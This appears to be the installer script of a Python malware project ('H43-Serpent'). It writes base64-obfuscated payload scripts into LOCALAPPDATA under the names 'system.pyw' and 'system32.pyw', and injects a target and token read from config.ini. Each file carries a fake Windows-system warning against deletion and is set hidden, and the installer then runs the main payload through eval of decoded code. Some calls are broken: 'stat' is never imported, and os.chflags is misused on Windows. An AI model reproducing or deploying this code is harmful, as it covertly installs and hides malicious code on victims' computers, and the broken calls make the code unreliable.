'''
Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


# Avoid using pip so injection is as fast as possible
import os
import sys
import base64
import importlib
import configparser

MAIN = 'system'
LIB = 'system32'

SCRIPTS_FOLDER = 'scripts'
MAIN_SCRIPT_NAME = MAIN + '.pyw'
LIB_SCRIPT_NAME = LIB + '.pyw'

config = configparser.ConfigParser()
config.read('config.ini')
TARGET = config['CONFIGS']['TARGET']
TOKEN = config['CONFIGS']['TOKEN']

d = os.getenv("LOCALAPPDATA")


file_base64_content = '''\'\'\'
WINDOWS SYSTEM

[Warning]
Deleting this system\'s file can make your computer malfunction.
Action is irreversible.
\'\'\'


import base64
eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
'''


with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME)) as from_file:
    TARGET_VAR = from_file.readline().split('=')[0]
    TOKEN_VAR = from_file.readline().split('=')[0]
    LIB_VAR = from_file.readline().split('=')[0]

    
    replacement_line = f'{TARGET_VAR}= \'{TARGET}\'\n{TOKEN_VAR}= \'{TOKEN}\'\n{LIB_VAR}= \'{LIB}\'\n'
    text = replacement_line + from_file.read()
    encoded = base64.b64encode(text.encode())


main_file_path = os.path.join(d, MAIN_SCRIPT_NAME)    
with open(main_file_path, 'w') as to_file:  
    to_file.write(file_base64_content.format(encoded))
    attributes = os.stat(main_file_path).st_file_attributes
    os.chflags(main_file_path, attributes | stat.FILE_ATTRIBUTE_HIDDEN)




with open(os.path.join(SCRIPTS_FOLDER, LIB_SCRIPT_NAME)) as from_file:
    text = from_file.read()
    encoded = base64.b64encode(text.encode())


lib_file_path = os.path.join(d, LIB_SCRIPT_NAME)        
with open(lib_file_path, 'w') as to_file:  
    to_file.write(file_base64_content.format(encoded))
    attributes = os.stat(lib_file_path).st_file_attributes
    os.chflags(lib_file_path, attributes | stat.FILE_ATTRIBUTE_HIDDEN)



os.chdir(d)
sys.path.insert(0, d)

importlib.import_module(MAIN_SCRIPT_NAME)



